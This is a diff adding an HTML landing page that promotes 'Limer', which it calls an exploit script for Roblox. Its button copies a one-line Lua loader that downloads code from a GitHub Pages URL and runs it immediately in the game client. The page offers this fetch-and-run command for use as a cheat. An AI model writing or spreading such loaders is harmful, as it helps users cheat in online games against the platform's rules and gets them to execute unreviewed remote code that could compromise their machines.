@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Limer</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+    <div class="banner">
+
+        <div class="navbar">
+            <img onclick="alert('Limer Logo')" src="./logo.png" class="logo">
+            <ul>
+                <li><a href="./index.html">Home</a></li>
+                <li><a href="./games.html">Games</a></li>
+            </ul>
+        </div>
+
+        <div class="content">
+            <h1>Limer</h1>
+            <h2>Best exploit script for roblox.</h2><br>
+            <button id="scriptBtn"><span style="color: rgb(78, 153, 204);">loadstring</span>(game:<span style="color: rgb(78, 153, 204);">HttpGetAsync</span><span style="color: rgb(80, 179, 179);">'</span><span style="color: rgb(149, 199, 144);">https://85t.github.io/limer.txt</span><span style="color: rgb(80, 179, 179);">'</span>)()</button>
+        </div>
+
+    </div>
+</body>
+<script type="text/javascript">
+    const scriptBtn = document.getElementById("scriptBtn");
+
+    scriptBtn.addEventListener("click", () => {
+        const scriptBox = document.createElement("textarea");
+        scriptBox.value = "loadstring(game:HttpGetAsync'https://85t.github.io/limer.txt')()";
+        document.body.appendChild(scriptBox);
+        scriptBox.select();
+        document.execCommand("copy");
+        document.body.removeChild(scriptBox);
+        alert("Limer\nCopied Script!");
+    });
+</script>
+</html>
